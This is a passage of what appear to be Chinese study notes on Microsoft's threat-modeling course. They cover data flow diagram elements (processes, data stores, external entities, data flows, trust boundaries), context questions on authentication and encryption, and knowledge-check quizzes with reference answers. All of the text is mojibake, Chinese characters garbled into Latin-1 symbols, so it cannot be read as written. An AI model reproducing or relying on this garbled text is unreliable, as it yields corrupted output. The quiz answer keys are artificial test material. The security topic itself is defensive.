STRIDEï¼Œå¹¶è¿›ä¸€æ­¥äº†è§£å­˜åœ¨çš„é£é™©ä»¥åŠå¦‚ä½•é’ˆå¯¹è¿™äº›é£é™©ä¿æŠ¤ç³»ç»Ÿã€‚ 6 è®¾ç½®é—®é¢˜çš„ä¼˜å…ˆçº§å¹¶åº”ç”¨å®‰å…¨æ§åˆ¶æªæ–½ äº†è§£å¦‚ä½•è®¾ç½®å¨èƒä¼˜å…ˆçº§ï¼Œå¹¶äº†è§£ç³»ç»Ÿå®‰å…¨æ§åˆ¶çš„ä¸åŒç±»å‹å’ŒåŠŸèƒ½ã€‚ 7 ä½¿ç”¨æ¨èå·¥å…·åˆ›å»ºæ•°æ®æµå›¾ äº†è§£å¯ç”¨äºå¨èƒå»ºæ¨¡çš„å·¥å…·ã€‚ äº†è§£è¯¦ç»†ä¿¡æ¯å®‰å…¨å¼€å‘ç”Ÿå‘½å‘¨æœŸhttps://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling æ¨¡å—2 | ä½¿ç”¨æ•°æ®æµå…³ç³»å›¾å…ƒç´ åˆ›å»ºå¨èƒæ¨¡å‹ç®€ä»‹æ•°æ®æµå…³ç³»å›¾ç”±å‘ˆç°ä¸ºå½¢çŠ¶å’Œçº¿æ¡çš„å…ƒç´ æ„æˆã€‚ æ•°æ®æµå…³ç³»å›¾ä»¥å›¾å½¢æ–¹å¼è¡¨ç¤ºç³»ç»Ÿçš„å„ä¸ªä¸»è¦éƒ¨åˆ†ã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š ç”¨äºå­˜å‚¨å®¢æˆ·æ•°æ®çš„ Azure DB å¤„ç†ç”¨æˆ·è¯·æ±‚çš„ Web æœåŠ¡ ä¸ç³»ç»Ÿäº¤äº’çš„ç”¨æˆ· è·¨ä¿¡ä»»åŒºåŸŸçº§åˆ«æ›´æ”¹çš„æ•°æ®æµ åœ¨å¨èƒå»ºæ¨¡ä¸­ä½¿ç”¨å…ƒç´ åŠå…¶äº¤äº’ï¼Œä»¥å¸®åŠ©ç¡®å®šå¨èƒå¹¶é™ä½ç³»ç»Ÿé£é™©ã€‚ æ­¤è¿‡ç¨‹å¯å¸®åŠ©å·¥ç¨‹å¸ˆæ›´æœ‰æ•ˆåœ°è¿›è¡Œåä½œï¼ŒåŒæ—¶ä¿æŠ¤å…¶ç³»ç»Ÿå…å—æœ€å¸¸è§çš„å¨èƒæ”»å‡»ã€‚ æœ¬æ¨¡å—å°†ä»‹ç»æ•°æ®æµå…³ç³»å›¾çš„æ¯ä¸ªå…ƒç´ ã€‚ è¿™äº›å…ƒç´ å…·æœ‰ä¸åŒçš„å½¢çŠ¶å’ŒåŠŸèƒ½ï¼Œå¹¶ä¸”éœ€è¦ç‰¹å®šçš„ä¸Šä¸‹æ–‡ã€‚ åœ¨æ•´ä¸ªå­¦ä¹ è·¯å¾„ä¸­ï¼Œå…ƒç´ ä¹Ÿå¯ä»¥ç§°ä¸ºâ€œæ¨¡å…·â€ã€‚ ä½•æ—¶ä½¿ç”¨å…ƒç´ åœ¨åˆ›å»ºæ•°æ®æµå…³ç³»å›¾æ—¶ä½¿ç”¨è¿™äº›å…ƒç´ ã€‚ å…³ç³»å›¾å¯æ˜¾ç¤ºç³»ç»Ÿåˆ›å»ºã€æ“çºµã€å­˜å‚¨ä»¥åŠåˆ é™¤æ•°æ®çš„æ–¹å¼ã€‚ æˆ‘ä»¬ä»¥ç¬¬ä¸€ä¸ªæ¨¡å—ä¸­çš„ç¤ºä¾‹ä¸ºåŸºç¡€è¿›è¡Œæ„å»ºï¼š Azure å¾®æœåŠ¡ - æ·»åŠ å…ƒç´ ä»¥æŒ‡å®šç”¨æˆ·ã€èº«ä»½éªŒè¯è¿‡ç¨‹ã€æ•°æ®å­˜å‚¨ã€æ•°æ®è¯·æ±‚å’Œå“åº”å¤„ç†è¿‡ç¨‹ã€‚ åˆ«å¿˜äº†æŒ‡å®šä¿¡ä»»åŒºåŸŸçº§åˆ«æ›´æ”¹ã€‚ å…¬å…± API - æ·»åŠ å…ƒç´ ä»¥æŒ‡å®šç”¨æˆ·ã€æ•°æ®å­˜å‚¨ã€æ—¥å¿—è®°å½•å’Œç›‘è§†æµç¨‹ä»¥åŠç³»ç»Ÿçš„å…¶ä»–éƒ¨åˆ†ã€‚ ç°æœ‰åº”ç”¨ç¨‹åºä¸Šçš„æ–°åŠŸèƒ½ - æ·»åŠ å…ƒç´ ä»¥è¡¨ç¤ºç³»ç»Ÿçš„ç°æœ‰éƒ¨åˆ†å’Œæ–°çš„éƒ¨åˆ†ã€‚ å­¦ä¹ ç›®æ ‡åœ¨æœ¬æ¨¡å—ä¸­ï¼Œä½ å°†èƒ½å¤Ÿï¼š åŒºåˆ†æ¯ä¸ªå…ƒç´ çš„å½¢çŠ¶å’ŒåŠŸèƒ½ åœ¨åˆ›å»ºæ•°æ®æµå…³ç³»å›¾æ—¶ï¼ŒåŒ…å«å…ƒç´ çš„æ­£ç¡®ä¸Šä¸‹æ–‡ æ— å¿…å¤‡çŸ¥è¯†å³å¯å­¦ä¹  ï¼ˆ æ•°æ®æµå…³ç³»å›¾å…ƒç´ æ•°æ®æµå…³ç³»å›¾ç”±å„ç§å½¢çŠ¶ç»„æˆï¼Œè¿™äº›å½¢çŠ¶ç”¨äºåˆ›å»ºç³»ç»Ÿçš„å›¾å½¢è¡¨ç¤ºå½¢å¼ã€‚ æ¯ä¸ªå½¢çŠ¶éƒ½è¡¨ç¤ºä¸€ä¸ªç‹¬ç‰¹çš„åŠŸèƒ½ã€‚ ç³»ç»Ÿå°†åˆ†ææ¯ä¸ªäº¤äº’ä»¥å¸®åŠ©è¯†åˆ«æ½œåœ¨çš„å¨èƒå’Œæ‰¾åˆ°é™ä½é£é™©çš„æ–¹æ³•ã€‚ é€šè¿‡æ­£ç¡®ä½¿ç”¨å½¢çŠ¶ï¼Œä½ èƒ½æ›´å¥½åœ°æ˜ç™½åŒäº‹å’Œå®‰å…¨å›¢é˜Ÿæä¾›çš„ä¿¡æ¯ã€‚ æ¯ä¸ªäººéƒ½èƒ½äº†è§£è¯¥ç³»ç»Ÿçš„å·¥ä½œæ–¹å¼ã€‚ è¿™è¿˜å¯ä»¥ä½¿ä»–ä»¬æ— éœ€æŸ¥é˜…æ— æ•°çš„è®¾è®¡æ–‡æ¡£å’Œå¼€å‘è®¡åˆ’å³å¯å¯åŠ¨ç³»ç»Ÿå¹¶ä½¿å…¶æ­£å¸¸è¿è¡Œã€‚ å¦‚æœæ— æ³•åœ¨æ•°æ®æµå…³ç³»å›¾ä¸­æ­£ç¡®åœ°ä½“ç°ç³»ç»Ÿçš„æ‰€æœ‰éƒ¨åˆ†ï¼Œåˆ™æœ‰å¯èƒ½éƒ¨ç½²å…·æœ‰æ½œåœ¨æ¼æ´çš„ç³»ç»Ÿã€‚ å…ƒç´  å½¢çŠ¶ å®šä¹‰ ç¤ºä¾‹ è¿‡ç¨‹ æ¥æ”¶ã€ä¿®æ”¹è¾“å…¥æˆ–å°†è¾“å…¥é‡å®šå‘åˆ°è¾“å‡ºçš„ä»»åŠ¡ï¼Œå¦‚ Web æœåŠ¡ã€‚ Web æœåŠ¡ æ•°æ®å­˜å‚¨ æ°¸ä¹…å’Œä¸´æ—¶æ•°æ®å­˜å‚¨ï¼Œå¦‚ Web ç¼“å­˜å’Œ Azure æ‰˜ç®¡æ•°æ®åº“ã€‚ Web ç¼“å­˜å’Œ Azure DB å¤–éƒ¨å®ä½“ ç›´æ¥æ§åˆ¶ä¹‹å¤–çš„ä»»åŠ¡ã€å®ä½“æˆ–æ•°æ®å­˜å‚¨ï¼Œå¦‚ç”¨æˆ·å’Œç¬¬ä¸‰æ–¹ APIã€‚ ç”¨æˆ·å’Œç¬¬ä¸‰æ–¹ API æ•°æ®æµ è¿›ç¨‹ã€æ•°æ®å­˜å‚¨å’Œå¤–éƒ¨å®ä½“ä¹‹é—´çš„æ•°æ®ç§»åŠ¨ï¼Œå¦‚è¿æ¥å­—ç¬¦ä¸²å’Œæœ‰æ•ˆè´Ÿè½½ã€‚ è¿æ¥å­—ç¬¦ä¸²å’Œæœ‰æ•ˆè´Ÿè½½ ä¿¡ä»»è¾¹ç•Œ ä¿¡ä»»åŒºåŸŸåœ¨æ•°æ®æµç»ç³»ç»Ÿæ—¶æ›´æ”¹ï¼Œå¦‚ç”¨æˆ·ä½¿ç”¨ Internet è®¿é—®å—ä¿æŠ¤çš„å…¬å¸ç½‘ç»œæ—¶ã€‚ ç”¨æˆ·é€šè¿‡ Internet è¿æ¥åˆ°å®‰å…¨çš„å…¬å¸ç½‘ç»œ æˆ‘ä»¬å°†åœ¨æ¥ä¸‹æ¥çš„å‡ ä¸ªå•å…ƒä¸­è®¨è®ºæ¯ä¸ªå…ƒç´ ã€‚ è¿‡ç¨‹ - ä»»åŠ¡å…ƒç´  æ­¤å…ƒç´ ç”¨ä¸€ä¸ªåœ†åœˆè¡¨ç¤ºï¼Œè¡¨ç¤ºå¯ä»¥ä¿®æ”¹æ¥æ”¶çš„è¾“å…¥æˆ–å°†æ¥æ”¶çš„è¾“å…¥é‡å®šå‘åˆ°å…¶ç›¸åº”è¾“å‡ºçš„æ´»åŠ¨ã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š æ¥æ”¶ API è°ƒç”¨è¯·æ±‚å¹¶å°†å…¶è½¬å‘åˆ° API å¤„ç†æœåŠ¡çš„å¾®æœåŠ¡ åœ¨æ•°æ®å†™å…¥æ•°æ®å­˜å‚¨ä¹‹å‰éªŒè¯æ•°æ®è¾“å…¥çš„ä»£ç  ä½•æ—¶ä½¿ç”¨è¿‡ç¨‹å…ƒç´ åœ¨ä»¥ä¸‹é¡¹ä¹‹é—´æ·»åŠ è¿‡ç¨‹å…ƒç´ ï¼š æ•°æ®å­˜å‚¨ - å¤„ç†æ•°æ®å­˜å‚¨ä¹‹é—´çš„æ‰€æœ‰é€šä¿¡çš„è¿‡ç¨‹ å…·æœ‰å…¶ä»–å…ƒç´ çš„å¤–éƒ¨å®ä½“ - å¤„ç†æ‰€æœ‰ä»»åŠ¡å’Œé€šä¿¡çš„è¿‡ç¨‹ è¿‡ç¨‹ - å¤„ç†æ‰€æœ‰ä»»åŠ¡çš„è¿‡ç¨‹ æ ¹æ®æ•°æ®æµå…³ç³»å›¾æ‰€éœ€çš„ä¿¡æ¯æ·±åº¦çº§åˆ«ï¼Œå¯ä»¥ä½¿ç”¨è¿‡ç¨‹å…ƒç´ æ¥è¡¨ç¤ºå‡ ä¸ªä¸åŒçš„ç”¨ä¾‹ï¼š ç”¨ä¾‹ æè¿° å­˜æ ¹ åœ¨è¾ƒé«˜çº§åˆ«çš„æ•°æ®æµå…³ç³»å›¾ä¸­å°†è¿‡ç¨‹å…ƒç´ ç”¨ä½œâ€œå­˜æ ¹â€ï¼Œè¿™æ˜¯ä¸€ç§æœ‰åŠ©äºä¿æŒæ•´æ´çš„å¥½æ–¹æ³•ã€‚ å®ƒæ¶‰åŠä¸ºç‰¹å®šè¿‡ç¨‹åˆ›å»ºä¸€ä¸ªå•ç‹¬çš„æ•°æ®æµå…³ç³»å›¾ï¼Œå¹¶å°†å…¶æ˜ å°„å›æ›´é«˜çº§åˆ«çš„å…³ç³»å›¾ã€‚ å®ƒçš„å·¥ä½œæ–¹å¼ç±»ä¼¼äºâ€œæ”¾å¤§â€åŠŸèƒ½ï¼Œåœ¨â€œæ”¾å¤§â€è¿‡ç¨‹æ—¶ï¼Œå¯ä»¥ä½¿ç”¨æ·±å±‚æ•°æ®æµå…³ç³»å›¾ã€‚ å¤šä¸ªä»»åŠ¡ å½“è¿‡ç¨‹å¤„ç†å¤šä¸ªä»»åŠ¡æ—¶ï¼Œæ­¤ç”¨ä¾‹é€‚ç”¨ã€‚ æ­¤ä¸Šä¸‹æ–‡éå¸¸é‡è¦ï¼Œå› ä¸ºå®ƒå…è®¸æŸ¥çœ‹æ•°æ®æµç¨‹å›¾çš„ä»»ä½•äººä¸ºæ¯ä¸ªä»»åŠ¡åº”ç”¨é€‚å½“çš„å®‰å…¨æ§åˆ¶ã€‚ åŒ…æ‹¬ä¸Šä¸‹æ–‡åœ¨æ¯ä¸ªè¿‡ç¨‹å…ƒç´ ä¸­åŒ…å«ä»¥ä¸‹ä¸Šä¸‹æ–‡ï¼š ä¸Šä¸‹æ–‡ é—®é¢˜ ä»£ç  æ­¤è¿‡ç¨‹æ˜¯å¦ä»¥ C#ã€C++ã€Objective Cã€Java æˆ–è„šæœ¬è¯­è¨€è¿è¡Œï¼Ÿ æƒé™çº§åˆ« æ­¤è¿‡ç¨‹æ˜¯å¦éœ€è¦å†…æ ¸ã€æœ¬åœ°æˆ–ç®¡ç†çº§åˆ«æƒé™æ‰èƒ½è¿è¡Œï¼Ÿ æœåŠ¡éš”ç¦» è¯¥è¿‡ç¨‹æ˜¯å¦åœ¨æ²™ç›’ä¸­è¿è¡Œï¼Ÿ è¾“å…¥ æ­¤è¿‡ç¨‹å¯ä»¥æ¥å—æ‰€æœ‰äººã€æœ¬åœ°å¸æˆ·è¿˜æ˜¯ä»…é™ç®¡ç†å‘˜çš„è¾“å…¥ï¼Ÿ éªŒè¯ æ­¤è¿‡ç¨‹å¦‚ä½•åˆ†æã€å¤„ç†å’Œæ¥å—è¾“å…¥ï¼Ÿ èº«ä»½éªŒè¯ æ­¤è¿‡ç¨‹æ˜¯å¦ä¾èµ–äº Azure Active Directory è¿›è¡Œèº«ä»½éªŒè¯ï¼Ÿ å¦‚æœä¸æ˜¯ï¼Œæ­¤è¿‡ç¨‹ä¾èµ–äºä»€ä¹ˆè¿›è¡Œèº«ä»½éªŒè¯ï¼Ÿ æˆæƒ å®ƒæ˜¯å¦ä¾èµ–äºè®¿é—®æ§åˆ¶åˆ—è¡¨ (ACL) è¿›è¡Œæˆæƒï¼Ÿ å¦‚æœä¸æ˜¯ï¼Œæ­¤è¿‡ç¨‹ä¾èµ–äºä»€ä¹ˆè¿›è¡Œæˆæƒï¼Ÿ çŸ¥è¯†æ£€æŸ¥ ä»¥ä¸‹å“ªä¸€é¡¹æ“ä½œæœ€èƒ½æè¿°è¿‡ç¨‹ï¼Ÿ A. Web é—¨æˆ·è¦æ±‚ç”¨æˆ·æä¾›å…¶å‡­æ®ã€‚ B. ç¼“å­˜ä¸ºç”¨æˆ·å­˜å‚¨ä¸æœåŠ¡ç›¸å…³çš„ Cookieã€‚ C. ç¬¬ä¸‰æ–¹ API å‘å…¶è¯·æ±‚è€…å‘é€è¯·æ±‚çš„æ•°æ®ã€‚ å‚è€ƒç­”æ¡ˆï¼š== A == è§£é‡Šï¼šA. é—¨æˆ·å°†å¤„ç†ç”¨æˆ·è¾“å…¥ï¼Œå¹¶å°†å…¶å‘é€åˆ°è¿‡ç¨‹çš„ä¸‹ä¸€éƒ¨åˆ†ã€‚B. å­˜å‚¨æ•°æ®çš„è¡Œä¸ºæ˜¯ä¸æ•°æ®å­˜å‚¨ç›¸å…³çš„äº‹ä»¶ã€‚C. ä¼ è¾“æ•°æ®çš„è¡Œä¸ºæ˜¯ä¸æ•°æ®æµç›¸å…³çš„äº‹ä»¶ã€‚ æ•°æ®å­˜å‚¨ - å­˜å‚¨å…ƒç´  æ­¤å…ƒç´ ç”¨å¹³è¡Œçº¿è¡¨ç¤ºï¼Œè¡¨ç¤ºä¸´æ—¶æˆ–æ°¸ä¹…å­˜å‚¨çš„æ•°æ®ã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š ä½¿ç”¨æµè§ˆå™¨ç¼“å­˜æ¥å­˜å‚¨ä¸ç”¨æˆ·ä¼šè¯ç›¸å…³çš„æ•°æ® å‘æ•°æ®åº“æ·»åŠ å®‰å…¨æ—¥å¿—äº‹ä»¶ ä½•æ—¶ä½¿ç”¨æ•°æ®å­˜å‚¨å…ƒç´  åœ¨æ¯æ¬¡å°†æ•°æ®å­˜å‚¨åœ¨ Azure DB æˆ–æœ¬åœ°ç¼“å­˜ç­‰ä½ç½®æ—¶ å¦‚æœè¦åœ¨ä¸¤ä¸ªæ•°æ®å­˜å‚¨ä¹‹é—´å»ºç«‹é€šä¿¡ï¼Œè¯·ä¸è¦å¿˜è®°åœ¨å®ƒä»¬ä¹‹é—´æ·»åŠ è¿›ç¨‹ æ•°æ®å­˜å‚¨å’Œå¤–éƒ¨å®ä½“éƒ½å¯å¯åŠ¨æ•°æ®æµï¼Œå› æ­¤è¯·éªŒè¯è¿™ä¸¤è€…ä¸­çš„ä»»æ„ä¸€ä¸ªæ˜¯å¦å·²å°±ç»ª ç¡®ä¿å°†æ•°æ®åæœŸå¤„ç†åŒ…å«åœ¨å†…ï¼Œä¾‹å¦‚ Azure Analytics ç­‰åˆ†ææœåŠ¡ã€‚ æ­¤è¿‡ç¨‹ç»å¸¸è¢«å¿½ç•¥ã€‚ åŒ…å«ä¸Šä¸‹æ–‡åœ¨æ¯ä¸ªæ•°æ®å­˜å‚¨å…ƒç´ ä¸­åŒ…å«ä»¥ä¸‹ä¸Šä¸‹æ–‡ï¼š ä¸Šä¸‹æ–‡ é—®é¢˜ ç±»å‹ ç³»ç»Ÿæ˜¯å¦ä½¿ç”¨ Azure SQLã€Cookieã€æœ¬åœ°æˆ–å…¶ä»–æŸç§ç±»å‹çš„å­˜å‚¨ï¼Ÿ å¦‚æœæ˜¯ï¼Œç³»ç»Ÿä½¿ç”¨çš„æ˜¯å“ªç§å­˜å‚¨ï¼Ÿ åŠŸèƒ½ å¦‚ä½•ä½¿ç”¨å­˜å‚¨ï¼Ÿ å®ƒæ˜¯å¦ç”¨äºå…±äº«æ•°æ®ã€å­˜å‚¨å¤‡ä»½ã€å®‰å…¨æ—¥å¿—ã€å‡­æ®å’Œæœºå¯†ï¼Ÿ æƒé™çº§åˆ« å¦‚ä½•å®ç°è®¿é—®æ§åˆ¶ï¼Ÿ æ‹¥æœ‰è¯»å†™æƒé™çš„äººå‘˜æœ‰å“ªäº›ï¼Ÿ å…¶ä»–æ§åˆ¶ æ•°æ®æ˜¯å¦åŠ å¯†ï¼Ÿ ç£ç›˜æ˜¯å¦åŠ å¯†ï¼Ÿ æ˜¯å¦ä½¿ç”¨æ•°å­—ç­¾åï¼Ÿ çŸ¥è¯†æ£€æŸ¥ ä»¥ä¸‹å“ªä¸€é¡¹æ“ä½œæœ€èƒ½æè¿°æ•°æ®å­˜å‚¨ï¼Ÿ A. Web é—¨æˆ·è¦æ±‚ç”¨æˆ·æä¾›å…¶å‡­æ®ã€‚ B. ç¼“å­˜ä¸ºç”¨æˆ·å­˜å‚¨ä¸æœåŠ¡ç›¸å…³çš„ Cookieã€‚ C. ç¬¬ä¸‰æ–¹ API å‘å…¶è¯·æ±‚è€…å‘é€è¯·æ±‚çš„æ•°æ®ã€‚ å‚è€ƒç­”æ¡ˆï¼š== B == è§£é‡Šï¼šA. å¤„ç†è¾“å…¥å’Œè¾“å‡ºçš„è¡Œä¸ºæ˜¯ä¸è¿‡ç¨‹ç›¸å…³çš„äº‹ä»¶ã€‚B. å­˜å‚¨æ•°æ®çš„è¡Œä¸ºæ˜¯ä¸æ•°æ®å­˜å‚¨ç›¸å…³çš„äº‹ä»¶ã€‚C. ä¼ è¾“æ•°æ®çš„è¡Œä¸ºæ˜¯ä¸æ•°æ®æµç›¸å…³çš„äº‹ä»¶ã€‚ å¤–éƒ¨å®ä½“ - æ— æ§åˆ¶å…ƒç´  å¤–éƒ¨å®ä½“å…ƒç´ ç”±æ­£æ–¹å½¢è¡¨ç¤ºï¼Œå¤–éƒ¨å®ä½“å¯ä»¥æ˜¯è¿‡ç¨‹ã€æ•°æ®å­˜å‚¨ï¼Œç”šè‡³æ˜¯ç›´æ¥æ§åˆ¶ä¹‹å¤–çš„å®Œæ•´ç³»ç»Ÿã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š ä¸æœåŠ¡äº¤äº’çš„ç”¨æˆ· ä¸ç¬¬ä¸‰æ–¹èº«ä»½éªŒè¯æœåŠ¡ç´§å¯†é›†æˆ ç»„ç»‡å†…ç”±å…¶ä»–å›¢é˜Ÿåˆ›å»ºçš„æœåŠ¡ ä½•æ—¶ä½¿ç”¨å¤–éƒ¨å®ä½“å…ƒç´  åœ¨è¦è¡¨ç¤ºä¸èƒ½ç›´æ¥ä¿®æ”¹çš„å†…å®¹æ—¶ æ•°æ®å­˜å‚¨å’Œå¤–éƒ¨å®ä½“éƒ½å¯å¯åŠ¨æ•°æ®æµï¼Œå› æ­¤è¯·éªŒè¯è¿™ä¸¤è€…ä¸­çš„ä»»æ„ä¸€ä¸ªæ˜¯å¦å·²å°±ç»ª åŒ…å«ä¸Šä¸‹æ–‡åœ¨æ¯ä¸ªå¤–éƒ¨å®ä½“å…ƒç´ ä¸­åŒ…å«ä»¥ä¸‹ä¸Šä¸‹æ–‡ï¼š ä¸Šä¸‹æ–‡ é—®é¢˜ æº å®ä½“æ˜¯å†…éƒ¨å®ä½“è¿˜æ˜¯å¤–éƒ¨å®ä½“ï¼Ÿ ç±»å‹ å®ä½“æ˜¯ç”¨æˆ·ã€æœåŠ¡æä¾›å•†è¿˜æ˜¯ Web æœåŠ¡ï¼Ÿ èº«ä»½éªŒè¯ æ­¤è¿‡ç¨‹æ˜¯å¦ä¾èµ–äº Azure Active Directory è¿›è¡Œèº«ä»½éªŒè¯ï¼Ÿ å¦‚æœä¸æ˜¯ï¼Œæ­¤è¿‡ç¨‹ä¾èµ–äºä»€ä¹ˆè¿›è¡Œèº«ä»½éªŒè¯ï¼Ÿ æˆæƒ å®ƒæ˜¯å¦ä¾èµ–äºè®¿é—®æ§åˆ¶åˆ—è¡¨ (ACL) è¿›è¡Œæˆæƒï¼Ÿ å¦‚æœä¸æ˜¯ï¼Œæ­¤è¿‡ç¨‹ä¾èµ–äºä»€ä¹ˆè¿›è¡Œæˆæƒï¼Ÿ çŸ¥è¯†æ£€æŸ¥ ä»¥ä¸‹å“ªä¸€é¡¹æ“ä½œæœ€å‡†ç¡®åœ°æè¿°äº†å¤–éƒ¨å®ä½“ï¼Ÿ A. Web é—¨æˆ·è¦æ±‚ç”¨æˆ·æä¾›å…¶å‡­æ®ã€‚ B. ç¼“å­˜ä¸ºç”¨æˆ·å­˜å‚¨ä¸æœåŠ¡ç›¸å…³çš„ Cookieã€‚ C. ç¬¬ä¸‰æ–¹ API å‘å…¶è¯·æ±‚è€…å‘é€è¯·æ±‚çš„æ•°æ®ã€‚ å‚è€ƒç­”æ¡ˆï¼š== C == è§£é‡Šï¼šA. å¤„ç†è¾“å…¥å’Œè¾“å‡ºçš„è¡Œä¸ºæ˜¯ä¸è¿‡ç¨‹ç›¸å…³çš„äº‹ä»¶ã€‚B. å­˜å‚¨æ•°æ®çš„è¡Œä¸ºæ˜¯ä¸æ•°æ®å­˜å‚¨ç›¸å…³çš„äº‹ä»¶ã€‚C. ä¼ è¾“æ•°æ®çš„è¡Œä¸ºæ˜¯ä¸æ•°æ®æµç›¸å…³çš„äº‹ä»¶ã€‚ è¿™ C ç­”æ¡ˆçš„è§£é‡Šå¥½åƒæœ‰ç‚¹é—®é¢˜ï¼Ÿåº”è¯¥è§£é‡Šä¸º ç¬¬ä¸‰æ–¹ API å‘è¯·æ±‚è€…å¯åŠ¨äº†æ•°æ®æµï¼Ÿ æ•°æ®æµ - ä¼ è¾“å…ƒç´ ä¸­çš„æ•°æ® å…ƒç´ ä¹‹é—´çš„æ•°æ®ç§»åŠ¨ç”¨æ–¹å‘ç®­å¤´è¡¨ç¤ºï¼Œ**ç”¨äºæŒ‡ç¤ºæ•°æ®æºå’Œç›®æ ‡ä¹‹é—´çš„é€šä¿¡**ã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š ç”¨æˆ·æäº¤çš„ç”¨äºè®¿é—®æœåŠ¡çš„å‡­æ® è¿‡ç¨‹å‘å‡ºçš„å‘æ•°æ®å­˜å‚¨æ·»åŠ é¡¹çš„è¯·æ±‚ ä½•æ—¶ä½¿ç”¨æ•°æ®æµå…ƒç´  åœ¨æ¯ä¸ªå…ƒç´ äº¤äº’ä¹‹é—´ è°ƒå‡ºæ­£åœ¨ä¼ è¾“çš„æ•°æ®ç±»å‹ï¼Œå¹¶åŒ…æ‹¬å…¶ä¼ è¾“æ–¹å¼ åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼ŒåŒ…æ‹¬å¯¹æ¯ä¸ªè¯·æ±‚çš„å“åº” åŒ…å«ä¸Šä¸‹æ–‡åŒ…å«æ¯ä¸ªæ•°æ®æµå…ƒç´ çš„ä»¥ä¸‹ä¸Šä¸‹æ–‡ï¼š ä¸Šä¸‹æ–‡ é—®é¢˜ æè¿° æ•°æ®æµæ˜¯å¦ä¼ é€’ä¼šè¯ä»¤ç‰Œã€SQL å­—ç¬¦ä¸²æˆ–ç”¨æˆ·å‡­æ®ï¼Ÿ å¦‚æœä¸æ˜¯ï¼Œé‚£ä¹ˆæ•°æ®æµä¼ é€’å“ªäº›å†…å®¹ï¼Ÿ åè®® æµä½¿ç”¨ HTTPS è¿˜æ˜¯ SOAPï¼Ÿ å¦‚æœéƒ½ä¸æ˜¯ï¼Œé‚£ä¹ˆæµä½¿ç”¨çš„æ˜¯ä»€ä¹ˆåè®®ï¼Ÿ æµåºåˆ— ç³»ç»Ÿæ˜¯å¦æšä¸¾æ•°æ®æµä»¥ä¾¿æ›´å®¹æ˜“éµå¾ªæµåºåˆ—ï¼Ÿ ç±»å‹ æ•°æ®æµä¸­åŒ…å«å“ªäº›ç±»å‹çš„æ•°æ®ï¼Ÿ Cookieï¼Ÿ XMLï¼Ÿ SOAP æœ‰æ•ˆè´Ÿè½½ï¼Ÿ REST æœ‰æ•ˆè´Ÿè½½ï¼Ÿ JSON æœ‰æ•ˆè´Ÿè½½ï¼Ÿ å…¶ä»–æ§åˆ¶ æ•°æ®æµæ˜¯å¦å¯ç”¨äº†ä¼ªé€ ä¿æŠ¤ï¼Ÿ æ˜¯å¦å¯ç”¨äº†å…¶ä»–å®‰å…¨æ ‡å¿—ï¼Ÿ èº«ä»½éªŒè¯ æ­¤è¿‡ç¨‹æ˜¯å¦ä¾èµ–äº Azure Active Directory è¿›è¡Œèº«ä»½éªŒè¯ï¼Ÿ å¦‚æœä¸æ˜¯ï¼Œæ­¤è¿‡ç¨‹ä¾èµ–äºä»€ä¹ˆè¿›è¡Œèº«ä»½éªŒè¯ï¼Ÿ æˆæƒ å®ƒæ˜¯å¦ä¾èµ–äºè®¿é—®æ§åˆ¶åˆ—è¡¨ (ACL) è¿›è¡Œæˆæƒï¼Ÿ å¦‚æœä¸æ˜¯ï¼Œæ­¤è¿‡ç¨‹ä¾èµ–äºä»€ä¹ˆè¿›è¡Œæˆæƒï¼Ÿ çŸ¥è¯†æ£€æŸ¥ ä»¥ä¸‹å“ªä¸€é¡¹æ“ä½œæœ€èƒ½æè¿°æ•°æ®æµï¼Ÿ A. ç”¨æˆ·å‡­æ®ä»è¿‡ç¨‹ä¼ è¾“åˆ°èº«ä»½éªŒè¯æœåŠ¡æä¾›å•†ã€‚ B. å­˜å‚¨ä¼šè¯ä»¤ç‰Œä»¥ä¾›ä»¥åä½¿ç”¨ã€‚ C. ç¬¬ä¸‰æ–¹ API å¤„ç†æœåŠ¡åˆ†æè¯·æ±‚ã€‚ å‚è€ƒç­”æ¡ˆï¼š== A == è§£é‡Šï¼šA. ä¼ è¾“æ•°æ®çš„è¡Œä¸ºæ˜¯ä¸æ•°æ®æµç›¸å…³çš„äº‹ä»¶ã€‚B. å­˜å‚¨æ•°æ®çš„è¡Œä¸ºæ˜¯ä¸æ•°æ®å­˜å‚¨ç›¸å…³çš„äº‹ä»¶ã€‚C. å¤„ç†æ•°æ®çš„è¡Œä¸ºæ˜¯ä¸è¿‡ç¨‹ç›¸å…³çš„äº‹ä»¶ã€‚ ä¿¡ä»»è¾¹ç•Œ - ä¿¡ä»»åŒºåŸŸæ›´æ”¹å…ƒç´ ä¿¡ä»»è¾¹ç•Œæ¡† ä¿¡ä»»è¾¹ç•Œçº¿ ä¿¡ä»»è¾¹ç•Œç”¨è™šçº¿æˆ–æ–¹æ¡†è¡¨ç¤ºï¼Œç”¨äºæè¿°è·¨ä¸åŒä¿¡ä»»åŒºåŸŸçº§åˆ«çš„æ•°æ®æµã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š é˜²ç«å¢™ ä¸ç¬¬ä¸‰æ–¹æœåŠ¡çš„è¿æ¥ ç³»ç»Ÿçš„æŸäº›éƒ¨åˆ†ä»…å¯¹ç®¡ç†å‘˜å¯ç”¨ ä¿¡ä»»åŒºåŸŸä¸æ–­å˜åŒ–çš„åŒºåŸŸæœ€æ˜“å—åˆ°æ”»å‡»è€…çš„æ”»å‡»ï¼Œåº”è°¨æ…è®¾è®¡æ­¤ç±»åŒºåŸŸã€‚ Microsoft å·²é¢„å®šä¹‰äº†ä¸€äº›ä¾›å·¥ç¨‹å¸ˆå†…éƒ¨ä½¿ç”¨çš„ä¿¡ä»»åŒºåŸŸè¦æ±‚ã€‚ä½ èƒ½æ¸…æ¥šåœ°ç¡®å®šè¦åº”ç”¨å“ªäº›è¾¹ç•Œã€‚å¯¹äº Microsoft çš„å‘˜å·¥ï¼Œè¯·ä¸å®‰å…¨å›¢é˜Ÿè”ç³»ä»¥äº†è§£è¯¦ç»†ä¿¡æ¯ã€‚ ä½•æ—¶ä½¿ç”¨ä¿¡ä»»è¾¹ç•Œå…ƒç´ å…³äºä¿¡ä»»è¾¹ç•Œï¼Œéœ€è¦è®°ä½ä»¥ä¸‹å‡ ä¸ªè¦ç‚¹ï¼š 